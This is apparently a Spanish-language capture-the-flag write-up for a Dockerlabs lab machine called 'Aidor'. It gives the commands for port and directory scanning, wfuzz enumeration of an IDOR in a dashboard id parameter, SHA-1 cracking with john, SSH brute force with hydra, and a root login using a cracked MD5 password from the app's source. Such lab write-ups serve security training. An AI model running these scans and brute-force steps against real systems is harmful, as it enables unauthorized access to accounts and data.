
---
# Writeup Template: Maquina `[ Aidor]`

- Tags: #werkzeug #idor
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Aidor](https://mega.nz/file/KNEAwSxD#zIfWSA5rLqUpqL_bac-irnzyXFalopXnZ5TM4-wJwUY) Laboratorio para practicar la vulnerabilidad IDOR y conseguir automatizar la extracción de información de distintos usuarios registrados en la web.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x aidor.tar
sudo bash auto_deploy.sh aidor.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,5000 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)  
5000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.13.5)
```
---

## Enumeracion de [Servicio Web Principal]
**Werkzeug**
**httpd 3.1.3** es la versión 3.1.3 de la biblioteca de desarrollo web de Python llamada Werkzeug, que funciona como un servidor HTTP (httpd) para entornos de desarrollo. Sirve para crear y probar aplicaciones web de Python, ofreciendo herramientas como un servidor de desarrollo, un depurador interactivo, un sistema de enrutamiento de URL y utilidades para manejar solicitudes HTTP, como cookies y encabezados. **No es para uso en producción**, ya que el servidor de desarrollo y el depurador pueden ser explotados si no se toman precauciones.

direccion **URL** del servicio:
```bash
http://172.17.0.2:5000/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2:5000  
http://172.17.0.2:5000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.1.3 Python/3.13.5], IP[172.17.0.2], PasswordField[password], Python[3.13.5], Script, Title[Iniciar Sesión], Werkzeug[3.1.3]
```
### Descubrimiento de Rutas
```bash
gobuster dir --ne -u http://172.17.0.2:5000/ -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100
```

**Hallazgos Relevantes:**
```bash
/register             (Status: 200) [Size: 17430]  
/logout               (Status: 302) [Size: 189] [--> /]  
/dashboard            (Status: 302) [Size: 189] [--> /]
```
### Descubrimiento de Subdominios
```bash
wfuzz -c -w [Diccionario] -H "Host:FUZZ.Aqui la URL" -u [IP_Objetivo]
```

Procedemos a loguearnos en la siguiente direccion URL creando un usuario random
```http
http://172.17.0.2:5000/register
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Una vulnerabilidad de Referencia Directa a Objeto Insegura **IDOR** ocurre cuando una aplicación web utiliza identificadores que los usuarios pueden controlar (como un número de factura en la URL) para acceder directamente a recursos, pero no valida si el usuario tiene permiso para acceder a ese recurso específico. Esto permite a un atacante manipular el identificador para ver o modificar información de otros usuarios, eludir la autorización y acceder directamente a recursos como registros o archivos sin tener los permisos adecuados.
### Ejecucion del Ataque
Tenemos esta URL que apunta a nuestro **ID** de usuario el cual podemos intentar manipular
```http
# Comandos para explotación
http://172.17.0.2:5000/dashboard?id=55
```

Generamos un diccionario basado en un rango de numeros:
```python
#!/usr/bin/env python3

def main():
    for num in range(0, 1001):
        print(num)

if __name__ == '__main__':
    main()
```

Ejecutamos el siguiente comando para fuzzear por usuarios validos en el sistema
```bash
wfuzz -c -w user_numbers.txt -u "http://172.17.0.2:5000/dashboard?id=FUZZ" --hc 302
```

Obteniendo como resultado los siguientes usuarios potenciales:
```txt
=====================================================================  
ID           Response   Lines    Word       Chars       Payload
=====================================================================  
000000029:   200        745 L    1568 W     23522 Ch    "28"
000000033:   200        745 L    1568 W     23516 Ch    "32"
000000015:   200        745 L    1568 W     23519 Ch    "14"
000000032:   200        745 L    1568 W     23516 Ch    "31"
000000007:   200        745 L    1568 W     23514 Ch    "6"
000000030:   200        745 L    1568 W     23528 Ch    "29"
000000031:   200        745 L    1568 W     23522 Ch    "30"
000000028:   200        745 L    1568 W     23447 Ch    "27"
000000027:   200        745 L    1568 W     23522 Ch    "26"
000000026:   200        745 L    1568 W     23516 Ch    "25"
000000025:   200        745 L    1568 W     23522 Ch    "24"
000000024:   200        745 L    1568 W     23528 Ch    "23"
000000023:   200        745 L    1568 W     23519 Ch    "22"
000000022:   200        745 L    1568 W     23531 Ch    "21"
000000021:   200        745 L    1568 W     23516 Ch    "20"
000000020:   200        745 L    1568 W     23516 Ch    "19"
000000019:   200        745 L    1568 W     23513 Ch    "18"
000000018:   200        745 L    1568 W     23522 Ch    "17"
000000017:   200        745 L    1568 W     23522 Ch    "16"
000000014:   200        745 L    1568 W     23516 Ch    "13"
000000016:   200        745 L    1568 W     23531 Ch    "15"
000000013:   200        745 L    1568 W     23525 Ch    "12"
000000012:   200        745 L    1568 W     23522 Ch    "11"
000000010:   200        745 L    1568 W     23526 Ch    "9"
000000009:   200        745 L    1568 W     23520 Ch    "8"
000000011:   200        745 L    1568 W     23513 Ch    "10"
000000008:   200        745 L    1568 W     23520 Ch    "7"
000000006:   200        745 L    1568 W     23514 Ch    "5"
000000005:   200        745 L    1568 W     23514 Ch    "4"
000000034:   200        745 L    1568 W     23522 Ch    "33"
000000004:   200        745 L    1568 W     23508 Ch    "3"
000000036:   200        745 L    1568 W     23516 Ch    "35"
000000040:   200        745 L    1568 W     23510 Ch    "39"
000000048:   200        745 L    1568 W     23516 Ch    "47"
000000056:   200        745 L    1568 W     23497 Ch    "55"
000000055:   200        745 L    1568 W     23492 Ch    "54"
000000054:   200        745 L    1568 W     23488 Ch    "53"
000000053:   200        745 L    1568 W     23492 Ch    "52"
000000051:   200        745 L    1568 W     23531 Ch    "50"
000000052:   200        745 L    1568 W     23513 Ch    "51"
000000050:   200        745 L    1568 W     23522 Ch    "49"
000000047:   200        745 L    1568 W     23519 Ch    "46"
000000049:   200        745 L    1568 W     23519 Ch    "48"
000000045:   200        745 L    1568 W     23519 Ch    "44"
000000046:   200        745 L    1568 W     23513 Ch    "45"
000000044:   200        745 L    1568 W     23519 Ch    "43"
000000043:   200        745 L    1568 W     23516 Ch    "42"
000000042:   200        745 L    1568 W     23519 Ch    "41"
000000039:   200        745 L    1568 W     23522 Ch    "38"
000000041:   200        745 L    1568 W     23516 Ch    "40"
000000038:   200        745 L    1568 W     23528 Ch    "37"
000000037:   200        745 L    1568 W     23516 Ch    "36"
000000035:   200        745 L    1568 W     23516 Ch    "34"
```

Revisando tenemos el posible hash de los usuarios para sus paswords
```bash
hash-identifier d033e22ae348aeb5660fc2140aec35850c4da997

Possible Hashs:  
[+] SHA-1
```

Esto nos da una via potencial de fuerza bruta sobre los hashes y despues un posible intento de conexion por ssh.
Todos los demas tienen el mismo hash...
```txt
admin:d033e22ae348aeb5660fc2140aec35850c4da997
```

Ejecutamos el siguiente comando para realizar fuerza bruta
```bash
john --format=raw-sha1 users_ssh.txt
```

Obtenemos el siguiente hash
```bash
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.  
admin            (admin)
```

Ahora realizamos un ataque pare estos tres usuarios del sistema **( admi, pingu, aidor )**:
```bash
hydra -l user.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -f
```

Logrando obtener credenciales validas.
```bash
[DATA] attacking ssh://172.17.0.2:22/  
[22][ssh] host: 172.17.0.2   login: aidor   password: chocolate
```
### Intrusion
Nos conectamos por ssh
```bash
# Reverse shell o acceso inicial
ssh aidor@172.17.0.2
```

---
## Escalada de Privilegios
### Enumeracion Usuraios del Sistema
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep 'sh'  
root:x:0:0:root:/root:/bin/bash  
aidor:x:1000:1000:aidor,,,:/home/aidor:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ Aidor ]`:
Revisanod el directorio home tenemos los siguientes archivos.
```txt
aidor  app.py  database.db  templates
```

Nos conectamos a la base de datos para ver que informacion podemos sacar
```sql
sqlite3 database.db
```

Ahora usando la siguiente query no obtenemos nada relevante
```sql
sqlite> select * from users;
```

Revisando la app de python vemos un hash md5
```bash
echo -n "aa87ddc5b4c24406d26ddad771ef44b0" | wc -c  
32
```

Si lo comparamos con el que ya teniamos vemos que son diferentes.
```bash
# hash de la app
aa87ddc5b4c24406d26ddad771ef44b0

# hash obtenido de la web
admin:d032e22ae348aeb5660fc2140aec35850c4da997
```

Usamos en la web un desencriptador para obtener la siguiente password
```text
aa87ddc5b4c24406d26ddad771ef44b0 : estrella
```

Ahora nos loguemos como el usuario root
```bash
# Comando para escalar al usuario: ( root )
su root # estrella
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@e61d02182cff:/home# echo -e "\n[+] Hacked $(whoami)"  
  
[+] Hacked root
```

---